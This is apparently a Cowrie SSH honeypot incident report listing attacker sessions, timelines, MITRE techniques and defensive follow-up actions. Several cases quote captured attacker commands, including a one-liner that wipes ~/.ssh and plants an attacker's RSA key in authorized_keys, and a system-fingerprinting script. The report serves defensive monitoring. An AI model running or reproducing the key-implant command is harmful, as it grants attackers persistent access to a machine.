### 🔴 HIGH · IR-2e9bbcf29923

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]31` |
| **First Seen** | 2026-10-16 01:30 |
| **Last Seen** | 2026-10-16 01:30 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-16 01:30:55` | `cowrie.session.connect` |
| `2026-10-16 01:30:55` | `cowrie.client.version` |
| `2026-10-16 01:30:55` | `cowrie.client.kex` |
| `2026-10-16 01:30:55` | `cowrie.login.success` |
| `2026-10-16 01:30:56` | `cowrie.session.params` |
| `2026-10-16 01:30:56` | `cowrie.command.input` |
| `2026-10-16 01:30:56` | `cowrie.log.closed` |
| `2026-10-16 01:30:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]31` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]31` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dae7d524ceae

| Field | Detail |
|---|---|
| **Source IP** | `124.155.125[.]131` |
| **First Seen** | 2026-10-16 01:31 |
| **Last Seen** | 2026-10-16 01:31 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-16 01:31:34` | `cowrie.session.connect` |
| `2026-10-16 01:31:34` | `cowrie.client.version` |
| `2026-10-16 01:31:34` | `cowrie.client.kex` |
| `2026-10-16 01:31:34` | `cowrie.login.success` |
| `2026-10-16 01:31:35` | `cowrie.session.params` |
| `2026-10-16 01:31:35` | `cowrie.command.input` |
| `2026-10-16 01:31:35` | `cowrie.command.failed` |
| `2026-10-16 01:31:36` | `cowrie.log.closed` |
| `2026-10-16 01:31:37` | `cowrie.session.params` |
| `2026-10-16 01:31:37` | `cowrie.command.input` |
| `2026-10-16 01:31:37` | `cowrie.session.file_download` |
| `2026-10-16 01:31:37` | `cowrie.log.closed` |
| `2026-10-16 01:31:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `124.155.125[.]131` to AbuseIPDB if not already reported
- [ ] Block `124.155.125[.]131` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6d79f691b8bb

| Field | Detail |
|---|---|
| **Source IP** | `124.155.125[.]131` |
| **First Seen** | 2026-10-16 01:31 |
| **Last Seen** | 2026-10-16 01:31 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-16 01:31:37` | `cowrie.session.connect` |
| `2026-10-16 01:31:37` | `cowrie.client.version` |
| `2026-10-16 01:31:38` | `cowrie.client.kex` |
| `2026-10-16 01:31:39` | `cowrie.login.success` |
| `2026-10-16 01:31:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `124.155.125[.]131` to AbuseIPDB if not already reported
- [ ] Block `124.155.125[.]131` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-664b41849433

| Field | Detail |
|---|---|
| **Source IP** | `118.38.44[.]223` |
| **First Seen** | 2026-10-16 01:35 |
| **Last Seen** | 2026-10-16 01:35 |
| **Session Duration** | 34s |
| **Login Attempts** | 2 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `zalee, za, &k`g&k|zpkfq)ES[M, g & k | zpkfq` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-16 01:35:10` | `cowrie.session.connect` |
| `2026-10-16 01:35:11` | `cowrie.login.success` |
| `2026-10-16 01:35:12` | `cowrie.login.success` |
| `2026-10-16 01:35:13` | `cowrie.session.params` |
| `2026-10-16 01:35:13` | `cowrie.command.input` |
| `2026-10-16 01:35:13` | `cowrie.command.failed` |
| `2026-10-16 01:35:14` | `cowrie.command.input` |
| `2026-10-16 01:35:14` | `cowrie.command.failed` |
| `2026-10-16 01:35:14` | `cowrie.command.input` |
| `2026-10-16 01:35:14` | `cowrie.command.input` |
| `2026-10-16 01:35:14` | `cowrie.command.failed` |
| `2026-10-16 01:35:14` | `cowrie.command.failed` |
| `2026-10-16 01:35:45` | `cowrie.log.closed` |
| `2026-10-16 01:35:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.38.44[.]223` to AbuseIPDB if not already reported
- [ ] Block `118.38.44[.]223` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1e6161f92900

| Field | Detail |
|---|---|
| **Source IP** | `165.154.164[.]112` |
| **First Seen** | 2026-10-16 01:36 |
| **Last Seen** | 2026-10-16 01:36 |
| **Session Duration** | 18s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6, User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0[.]0 Safari/537.36 Edg/120.0.0[.]0` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-16 01:36:32` | `cowrie.session.connect` |
| `2026-10-16 01:36:32` | `cowrie.login.success` |
| `2026-10-16 01:36:32` | `cowrie.session.params` |
| `2026-10-16 01:36:32` | `cowrie.command.input` |
| `2026-10-16 01:36:32` | `cowrie.command.failed` |
| `2026-10-16 01:36:32` | `cowrie.command.input` |
| `2026-10-16 01:36:32` | `cowrie.command.input` |
| `2026-10-16 01:36:51` | `cowrie.log.closed` |
| `2026-10-16 01:36:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.154.164[.]112` to AbuseIPDB if not already reported
- [ ] Block `165.154.164[.]112` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-964a8e4b9f5d

| Field | Detail |
|---|---|
| **Source IP** | `165.154.164[.]112` |
| **First Seen** | 2026-10-16 01:36 |
| **Last Seen** | 2026-10-16 01:37 |
| **Session Duration** | 18s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-16 01:36:51` | `cowrie.session.connect` |
| `2026-10-16 01:36:51` | `cowrie.login.success` |
| `2026-10-16 01:36:51` | `cowrie.session.params` |
| `2026-10-16 01:37:09` | `cowrie.log.closed` |
| `2026-10-16 01:37:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.154.164[.]112` to AbuseIPDB if not already reported
- [ ] Block `165.154.164[.]112` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-84d9d72ab450

| Field | Detail |
|---|---|
| **Source IP** | `118.38.44[.]223` |
| **First Seen** | 2026-10-16 01:37 |
| **Last Seen** | 2026-10-16 01:38 |
| **Session Duration** | 34s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `lghkel, zpz}ld, zalee, za, &k`g&k|zpkfq)ES[M` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-16 01:37:30` | `cowrie.session.connect` |
| `2026-10-16 01:37:31` | `cowrie.login.success` |
| `2026-10-16 01:37:31` | `cowrie.session.params` |
| `2026-10-16 01:37:32` | `cowrie.command.input` |
| `2026-10-16 01:37:32` | `cowrie.command.failed` |
| `2026-10-16 01:37:33` | `cowrie.command.input` |
| `2026-10-16 01:37:33` | `cowrie.command.failed` |
| `2026-10-16 01:37:33` | `cowrie.command.input` |
| `2026-10-16 01:37:33` | `cowrie.command.failed` |
| `2026-10-16 01:37:34` | `cowrie.command.input` |
| `2026-10-16 01:37:34` | `cowrie.command.failed` |
| `2026-10-16 01:37:34` | `cowrie.command.input` |
| `2026-10-16 01:37:34` | `cowrie.command.input` |
| `2026-10-16 01:37:34` | `cowrie.command.failed` |
| `2026-10-16 01:37:34` | `cowrie.command.failed` |
| … | _2 more event(s) — see ir_cases.json_ |

**Recommended Actions:**
- [ ] Submit `118.38.44[.]223` to AbuseIPDB if not already reported
- [ ] Block `118.38.44[.]223` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b6d2ce861c57

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-10-16 01:47 |
| **Last Seen** | 2026-10-16 01:47 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-16 01:47:27` | `cowrie.session.connect` |
| `2026-10-16 01:47:27` | `cowrie.client.version` |
| `2026-10-16 01:47:27` | `cowrie.client.kex` |
| `2026-10-16 01:47:27` | `cowrie.login.success` |
| `2026-10-16 01:47:27` | `cowrie.direct-tcpip.request` |
| `2026-10-16 01:47:27` | `cowrie.direct-tcpip.data` |
| `2026-10-16 01:47:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-84e051001df7

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]84` |
| **First Seen** | 2026-10-16 01:49 |
| **Last Seen** | 2026-10-16 01:50 |
| **Session Duration** | 54s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-16 01:49:10` | `cowrie.session.connect` |
| `2026-10-16 01:49:13` | `cowrie.client.version` |
| `2026-10-16 01:49:13` | `cowrie.client.kex` |
| `2026-10-16 01:49:26` | `cowrie.login.success` |
| `2026-10-16 01:49:52` | `cowrie.session.params` |
| `2026-10-16 01:49:52` | `cowrie.command.input` |
| `2026-10-16 01:49:52` | `cowrie.command.input` |
| `2026-10-16 01:49:52` | `cowrie.command.input` |
| `2026-10-16 01:49:52` | `cowrie.command.input` |
| `2026-10-16 01:49:52` | `cowrie.command.input` |
| `2026-10-16 01:49:52` | `cowrie.command.success` |
| `2026-10-16 01:49:52` | `cowrie.command.input` |
| `2026-10-16 01:49:52` | `cowrie.command.input` |
| `2026-10-16 01:49:52` | `cowrie.command.input` |
| `2026-10-16 01:49:52` | `cowrie.command.input` |
| … | _2 more event(s) — see ir_cases.json_ |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]84` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]84` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-da0c9a9c4358

| Field | Detail |
|---|---|
| **Source IP** | `109.160.32[.]31` |
| **First Seen** | 2026-10-16 02:00 |
| **Last Seen** | 2026-10-16 02:00 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-16 02:00:01` | `cowrie.session.connect` |
| `2026-10-16 02:00:01` | `cowrie.client.version` |
| `2026-10-16 02:00:01` | `cowrie.client.kex` |
| `2026-10-16 02:00:02` | `cowrie.login.success` |
| `2026-10-16 02:00:03` | `cowrie.session.params` |
| `2026-10-16 02:00:03` | `cowrie.command.input` |
| `2026-10-16 02:00:03` | `cowrie.log.closed` |
| `2026-10-16 02:00:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `109.160.32[.]31` to AbuseIPDB if not already reported
- [ ] Block `109.160.32[.]31` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-583dd53c647c

| Field | Detail |
|---|---|
| **Source IP** | `202.79.29[.]108` |
| **First Seen** | 2026-10-16 02:00 |
| **Last Seen** | 2026-10-16 02:00 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-16 02:00:07` | `cowrie.session.connect` |
| `2026-10-16 02:00:07` | `cowrie.client.version` |
| `2026-10-16 02:00:07` | `cowrie.client.kex` |
| `2026-10-16 02:00:08` | `cowrie.login.success` |
| `2026-10-16 02:00:09` | `cowrie.session.params` |
| `2026-10-16 02:00:09` | `cowrie.command.input` |
| `2026-10-16 02:00:09` | `cowrie.command.failed` |
| `2026-10-16 02:00:10` | `cowrie.log.closed` |
| `2026-10-16 02:00:11` | `cowrie.session.params` |
| `2026-10-16 02:00:11` | `cowrie.command.input` |
| `2026-10-16 02:00:11` | `cowrie.session.file_download` |
| `2026-10-16 02:00:11` | `cowrie.log.closed` |
| `2026-10-16 02:00:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `202.79.29[.]108` to AbuseIPDB if not already reported
- [ ] Block `202.79.29[.]108` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-acd908bf362e

| Field | Detail |
|---|---|
| **Source IP** | `202.79.29[.]108` |
| **First Seen** | 2026-10-16 02:00 |
| **Last Seen** | 2026-10-16 02:00 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-16 02:00:11` | `cowrie.session.connect` |
| `2026-10-16 02:00:11` | `cowrie.client.version` |
| `2026-10-16 02:00:12` | `cowrie.client.kex` |
| `2026-10-16 02:00:13` | `cowrie.login.success` |
| `2026-10-16 02:00:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `202.79.29[.]108` to AbuseIPDB if not already reported
- [ ] Block `202.79.29[.]108` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-414d1ea3fbe5

| Field | Detail |
|---|---|
| **Source IP** | `164.30.17[.]82` |
| **First Seen** | 2026-10-16 02:13 |
| **Last Seen** | 2026-10-16 02:13 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo xsec` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-10-16 02:13:53` | `cowrie.session.connect` |
| `2026-10-16 02:13:53` | `cowrie.client.version` |
| `2026-10-16 02:13:53` | `cowrie.client.kex` |
| `2026-10-16 02:13:53` | `cowrie.login.success` |
| `2026-10-16 02:13:54` | `cowrie.session.params` |
| `2026-10-16 02:13:54` | `cowrie.command.input` |
| `2026-10-16 02:13:54` | `cowrie.log.closed` |
| `2026-10-16 02:13:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `164.30.17[.]82` to AbuseIPDB if not already reported
- [ ] Block `164.30.17[.]82` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### Additional priority cases (134) — compact view

| Case | Severity | Source IP | First Seen | Auth | Cmds | DL | TTPs |
|---|---|---|---|---|---|---|---|
| IR-e3a5d7ab0fe5 | HIGH | `184.105.139[.]69` | 2026-10-16 02:16 | Y | 3 | 0 | `T1078` |
| IR-7e7bb97bf296 | HIGH | `184.16.113[.]62` | 2026-10-16 02:20 | Y | 1 | 0 | `T1078` |
| IR-437e78d49223 | HIGH | `35.241.214[.]195` | 2026-10-16 02:39 | Y | 2 | 0 | `T1078` |
| IR-829bd9dee7cb | HIGH | `35.241.214[.]195` | 2026-10-16 02:39 | Y | 1 | 0 | `T1078` |
| IR-42b035e1ff46 | HIGH | `35.241.214[.]195` | 2026-10-16 02:40 | Y | 0 | 0 | `T1078` |
| IR-a4cd141ac66c | HIGH | `35.205.227[.]161` | 2026-10-16 02:51 | Y | 2 | 0 | `T1078` |
| IR-9fa002007c46 | HIGH | `35.205.227[.]161` | 2026-10-16 02:52 | Y | 1 | 0 | `T1078` |
| IR-6163d07282f7 | HIGH | `35.205.227[.]161` | 2026-10-16 02:52 | Y | 0 | 0 | `T1078` |
| IR-00db7c15e71c | HIGH | `176.53.159[.]196` | 2026-10-16 03:07 | Y | 0 | 0 | `T1078 · T1592` |
| IR-62964cff4c97 | HIGH | `45.249.247[.]109` | 2026-10-16 03:23 | Y | 1 | 0 | `T1078` |
| IR-1272437b4163 | HIGH | `35.187.11[.]54` | 2026-10-16 03:27 | Y | 2 | 0 | `T1078` |
| IR-760fef82c59f | HIGH | `35.187.11[.]54` | 2026-10-16 03:27 | Y | 1 | 0 | `T1078` |
| IR-a7fd67ffc22c | HIGH | `35.187.11[.]54` | 2026-10-16 03:27 | Y | 0 | 0 | `T1078` |
| IR-3d728b1da566 | HIGH | `152.32.182[.]8` | 2026-10-16 03:30 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-5fa2934e41d1 | HIGH | `152.32.182[.]8` | 2026-10-16 03:30 | Y | 0 | 0 | `T1078 · T1592` |
| IR-e8e74c8308bb | HIGH | `152.32.208[.]116` | 2026-10-16 03:38 | Y | 0 | 0 | `T1078` |
| IR-60953c4bd3ad | HIGH | `152.32.208[.]116` | 2026-10-16 03:39 | Y | 2 | 0 | `T1078` |
| IR-14f1af5a6e45 | HIGH | `2.57.122[.]168` | 2026-10-16 03:41 | Y | 10 | 0 | `T1059.004 · T1078 · T1083` |
| IR-14b783611dbd | HIGH | `189.178.80[.]140` | 2026-10-16 03:59 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-51c6318027a3 | HIGH | `189.178.80[.]140` | 2026-10-16 03:59 | Y | 0 | 0 | `T1078 · T1592` |
| IR-fbc7be451379 | HIGH | `45.121.25[.]115` | 2026-10-16 03:59 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-5a95dc0846e5 | HIGH | `45.121.25[.]115` | 2026-10-16 03:59 | Y | 0 | 0 | `T1078 · T1592` |
| IR-5fe54e68fed2 | HIGH | `80.94.92[.]55` | 2026-10-16 04:03 | Y | 10 | 0 | `T1059.004 · T1078 · T1083` |
| IR-6f656bfd4cea | HIGH | `201.184.50[.]251` | 2026-10-16 04:04 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-88588732149f | HIGH | `201.184.50[.]251` | 2026-10-16 04:04 | Y | 0 | 0 | `T1078 · T1592` |
| IR-f1b74d6ff813 | HIGH | `176.53.159[.]196` | 2026-10-16 04:08 | Y | 0 | 0 | `T1078 · T1592` |
| IR-5bac413ac12c | HIGH | `152.89.12[.]101` | 2026-10-16 04:08 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-997ac252c2fd | HIGH | `152.89.12[.]101` | 2026-10-16 04:08 | Y | 0 | 0 | `T1078 · T1592` |
| IR-0c0f90413b1a | HIGH | `104.244.74[.]84` | 2026-10-16 04:09 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-e4fade5cb106 | HIGH | `104.244.74[.]84` | 2026-10-16 04:09 | Y | 0 | 0 | `T1078 · T1592` |
| IR-e34e4cb256bc | HIGH | `46.100.248[.]130` | 2026-10-16 04:15 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-846f8e750d04 | HIGH | `46.100.248[.]130` | 2026-10-16 04:15 | Y | 0 | 0 | `T1078 · T1592` |
| IR-64867ac7743d | HIGH | `112.161.75[.]207` | 2026-10-16 04:16 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-df0c1a14da8e | HIGH | `112.161.75[.]207` | 2026-10-16 04:16 | Y | 0 | 0 | `T1078 · T1592` |
| IR-169e0ad6e673 | HIGH | `167.71.211[.]40` | 2026-10-16 04:20 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-d2865cd49624 | HIGH | `167.71.211[.]40` | 2026-10-16 04:20 | Y | 0 | 0 | `T1078 · T1592` |
| IR-5550d8cfd216 | HIGH | `164.30.17[.]82` | 2026-10-16 04:30 | Y | 1 | 0 | `T1078 · T1592` |
| IR-fc870ec76f64 | HIGH | `130.12.180[.]32` | 2026-10-16 04:49 | Y | 1 | 0 | `T1078 · T1592` |
| IR-16d5932e5a7f | HIGH | `183.87.44[.]15` | 2026-10-16 04:50 | Y | 0 | 0 | `T1078 · T1592` |
| IR-3e1e4ba938d6 | HIGH | `35.233.54[.]251` | 2026-10-16 04:58 | Y | 0 | 0 | `T1078 · T1592` |
| IR-02fef65adc77 | HIGH | `145.63.130[.]152` | 2026-10-16 04:59 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-b4ac976a31e2 | HIGH | `145.63.130[.]152` | 2026-10-16 04:59 | Y | 0 | 0 | `T1078 · T1592` |
| IR-314db3147e99 | HIGH | `201.17.146[.]173` | 2026-10-16 05:01 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-430e89bda447 | HIGH | `201.17.146[.]173` | 2026-10-16 05:01 | Y | 0 | 0 | `T1078 · T1592` |
| IR-1dd801a965f7 | HIGH | `223.27.18[.]80` | 2026-10-16 05:01 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-b3e3ca5db294 | HIGH | `223.27.18[.]80` | 2026-10-16 05:01 | Y | 0 | 0 | `T1078 · T1592` |
| IR-e4b0498c26e1 | HIGH | `119.209.12[.]20` | 2026-10-16 05:04 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-18b6eafbc373 | HIGH | `119.209.12[.]20` | 2026-10-16 05:04 | Y | 0 | 0 | `T1078 · T1592` |
| IR-e9e34d49265d | HIGH | `145.239.85[.]118` | 2026-10-16 05:06 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-1800711cf892 | HIGH | `145.239.85[.]118` | 2026-10-16 05:06 | Y | 0 | 0 | `T1078 · T1592` |
| IR-c29fbc856383 | HIGH | `163.61.182[.]194` | 2026-10-16 05:14 | Y | 1 | 0 | `T1078 · T1592` |
| IR-2ecf92b23229 | HIGH | `80.94.95[.]109` | 2026-10-16 05:59 | Y | 1 | 0 | `T1078 · T1592` |
| IR-b7539a6bea86 | HIGH | `80.94.92[.]55` | 2026-10-16 06:00 | Y | 10 | 0 | `T1059.004 · T1078 · T1083` |
| IR-d3249beaed5d | HIGH | `175.155.122[.]208` | 2026-10-16 06:02 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-b11721e5863b | HIGH | `175.155.122[.]208` | 2026-10-16 06:02 | Y | 0 | 0 | `T1078 · T1592` |
| IR-a9d04a8ed336 | HIGH | `164.30.17[.]82` | 2026-10-16 06:12 | Y | 1 | 0 | `T1078 · T1592` |
| IR-8c60079931bc | HIGH | `176.53.159[.]196` | 2026-10-16 06:16 | Y | 0 | 0 | `T1078 · T1592` |
| IR-2d68eb97f245 | HIGH | `211.220.197[.]170` | 2026-10-16 06:49 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-b6a2faeb0d71 | HIGH | `211.220.197[.]170` | 2026-10-16 06:49 | Y | 0 | 0 | `T1078 · T1592` |
| IR-96be3ac184cf | HIGH | `45.78.202[.]217` | 2026-10-16 06:53 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-9b8b27325562 | HIGH | `45.78.202[.]217` | 2026-10-16 06:53 | Y | 0 | 0 | `T1078 · T1592` |
| IR-a8cb87eaa2a8 | HIGH | `218.0.63[.]25` | 2026-10-16 06:53 | Y | 2 | 0 | `T1021.004 · T1078 · T1592` |
| IR-ce01756a445c | HIGH | `46.101.137[.]209` | 2026-10-16 06:53 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-f2bada9d1896 | HIGH | `46.101.137[.]209` | 2026-10-16 06:53 | Y | 0 | 0 | `T1078 · T1592` |
| IR-b4115afec6a3 | HIGH | `51.178.84[.]57` | 2026-10-16 06:53 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-a4e08285effc | HIGH | `51.178.84[.]57` | 2026-10-16 06:53 | Y | 0 | 0 | `T1078 · T1592` |
| IR-438ac1b13e58 | HIGH | `218.0.63[.]25` | 2026-10-16 06:54 | Y | 0 | 0 | `T1078 · T1592` |
| IR-33bc1b54da82 | HIGH | `163.223.210[.]138` | 2026-10-16 06:55 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-9585832b0eb8 | HIGH | `163.223.210[.]138` | 2026-10-16 06:55 | Y | 0 | 0 | `T1078 · T1592` |
| IR-c5fcb406f571 | HIGH | `47.112.14[.]15` | 2026-10-16 07:10 | Y | 0 | 0 | `T1078` |
| IR-7a5ef9f81a3f | HIGH | `2.57.122[.]168` | 2026-10-16 07:12 | Y | 10 | 0 | `T1059.004 · T1078 · T1083` |
| IR-eae8190dad82 | HIGH | `195.86.192[.]66` | 2026-10-16 07:15 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
| IR-6e2883026c8b | HIGH | `195.86.192[.]66` | 2026-10-16 07:15 | Y | 0 | 0 | `T1078 · T1592` |
| IR-406392d0b792 | HIGH | `72.17.34[.]38` | 2026-10-16 07:25 | Y | 2 | 1 | `T1021.004 · T1078 · T1105` |
